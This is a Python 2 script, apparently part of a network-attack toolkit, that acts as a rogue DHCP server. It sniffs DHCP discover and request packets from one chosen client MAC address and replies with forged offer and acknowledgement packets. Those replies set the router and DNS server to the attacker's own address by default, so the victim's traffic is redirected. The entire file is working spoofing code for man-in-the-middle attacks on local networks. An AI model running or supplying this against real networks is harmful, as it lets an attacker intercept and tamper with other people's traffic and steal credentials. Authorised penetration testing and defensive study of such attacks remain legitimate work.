from base import Base
from sys import exit
from argparse import ArgumentParser
from binascii import unhexlify
from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sniff, sendp

Base.check_user()

parser = ArgumentParser(description='DHCP Reply (Offer and Ack) sender')

parser.add_argument('-i', '--interface', help='Set interface name for send reply packets')
parser.add_argument('-t', '--target_mac', type=str, required=True, help='Set target client mac address')
parser.add_argument('-o', '--offer_ip', type=str, required=True, help='Set client ip for offering')

parser.add_argument('--dhcp_mac', type=str, help='Set DHCP server mac address, if not set use your mac address')
parser.add_argument('--dhcp_ip', type=str, help='Set DHCP server IP address, if not set use your ip address')
parser.add_argument('--router', type=str, help='Set router IP address, if not set use your ip address')
parser.add_argument('--netmask', type=str, help='Set network mask, if not set use your netmask')
parser.add_argument('--broadcast', type=str, help='Set network broadcast, if not set use your broadcast')
parser.add_argument('--dns', type=str, help='Set DNS server IP address, if not set use your ip address')
parser.add_argument('--lease_time', type=int, help='Set lease time, default=172800', default=172800)

args = parser.parse_args()

current_network_interface = None
target_mac_address = None
offer_ip_address = None
dhcp_server_mac_address = None
dhcp_server_ip_address = None
router_ip_address = None
network_mask = None
network_broadcast = None
dns_server_ip_address = None

if args.interface is None:
    current_network_interface = Base.netiface_selection()
else:
    current_network_interface = args.interface

if args.target_mac is None:
    print "Please set client target mac address!"
    exit(1)
else:
    target_mac_address = args.target_mac.lower()

if args.offer_ip is None:
    print "Please set client IP address for offering!"
    exit(1)
else:
    offer_ip_address = args.offer_ip

your_mac_address = Base.get_netiface_mac_address(current_network_interface)
if your_mac_address is None:
    print "Network interface: " + current_network_interface + " do not have MAC address!"
    exit(1)

your_ip_address = Base.get_netiface_ip_address(current_network_interface)
if your_ip_address is None:
    print "Network interface: " + current_network_interface + " do not have IP address!"
    exit(1)

your_netmask = Base.get_netiface_netmask(current_network_interface)
if your_netmask is None:
    print "Network interface: " + current_network_interface + " do not have network mask!"
    exit(1)

your_broadcast = Base.get_netiface_broadcast(current_network_interface)
if your_broadcast is None:
    print "Network interface: " + current_network_interface + " do not have broadcast!"
    exit(1)

if args.dhcp_mac is None:
    dhcp_server_mac_address = your_mac_address
else:
    dhcp_server_mac_address = args.dhcp_mac

if args.dhcp_ip is None:
    dhcp_server_ip_address = your_ip_address
else:
    dhcp_server_ip_address = args.dhcp_ip

if args.router is None:
    router_ip_address = your_ip_address
else:
    router_ip_address = args.router

if args.netmask is None:
    network_mask = your_netmask
else:
    network_mask = args.netmask

if args.broadcast is None:
    network_broadcast = your_broadcast
else:
    network_broadcast = args.broadcast

if args.dns is None:
    dns_server_ip_address = your_ip_address
else:
    dns_server_ip_address = args.dns

print "\r\nNetwork interface: " + current_network_interface
print "Target mac address: " + target_mac_address
print "Offer IP: " + offer_ip_address
print "DHCP server mac address: " + dhcp_server_mac_address
print "DHCP server ip address: " + dhcp_server_ip_address
print "Router IP address: " + router_ip_address
print "Network mask: " + network_mask
print "DNS server IP address: " + dns_server_ip_address + "\r\n"


def make_dhcp_offer_packet(transaction_id):
    return (Ether(src=dhcp_server_mac_address, dst=target_mac_address) /
            IP(src=dhcp_server_ip_address, dst='255.255.255.255') /
            UDP(sport=67, dport=68) /
            BOOTP(op='BOOTREPLY', chaddr=unhexlify(target_mac_address.replace(":", "")),
                  yiaddr=offer_ip_address, siaddr="0.0.0.0", xid=transaction_id) /
            DHCP(options=[("message-type", "offer"),
                          ('server_id', dhcp_server_ip_address),
                          ('subnet_mask', network_mask),
                          ('broadcast_address', network_broadcast),
                          ('router', router_ip_address),
                          ('lease_time', args.lease_time),
                          ('name_server', dns_server_ip_address),
                          "end"]))


def make_dhcp_ack_packet(transaction_id, requested_ip):
    return (Ether(src=dhcp_server_mac_address, dst=target_mac_address) /
            IP(src=dhcp_server_ip_address, dst=requested_ip) /
            UDP(sport=67, dport=68) /
            BOOTP(op='BOOTREPLY', chaddr=unhexlify(target_mac_address.replace(":", "")),
                  yiaddr=requested_ip, siaddr="0.0.0.0", xid=transaction_id) /
            DHCP(options=[("message-type", "ack"),
                          ('server_id', dhcp_server_ip_address),
                          ('subnet_mask', network_mask),
                          ('broadcast_address', network_broadcast),
                          ('router', router_ip_address),
                          ('lease_time', args.lease_time),
                          ('name_server', dns_server_ip_address),
                          "end"]))


def dhcp_reply(request):
    if request.haslayer(DHCP):
        transaction_id = request[BOOTP].xid

        if request[DHCP].options[0][1] == 1:
            print "DHCP DISCOVER from: " + target_mac_address + " transaction id: " + hex(transaction_id)
            offer_packet = make_dhcp_offer_packet(transaction_id)
            sendp(offer_packet, iface=current_network_interface, verbose=False)

        if request[DHCP].options[0][1] == 3:
            requested_ip = str(request[DHCP].options[2][1])
            print "DHCP REQUEST from:  " + target_mac_address + " transaction id: " + hex(transaction_id) + \
                  " requested ip: " + requested_ip
            ack_packet = make_dhcp_ack_packet(transaction_id, requested_ip)
            sendp(ack_packet, iface=current_network_interface, verbose=False)


if __name__ == "__main__":
    print "Waiting for a DHCP DISCOVER or DHCP REQUEST from mac: " + target_mac_address + " ..."
    sniff(lfilter=lambda d: d.src == target_mac_address,
          filter="udp and src port 68 and dst port 67 and src host 0.0.0.0 and dst host 255.255.255.255",
          prn=dhcp_reply, iface=current_network_interface)
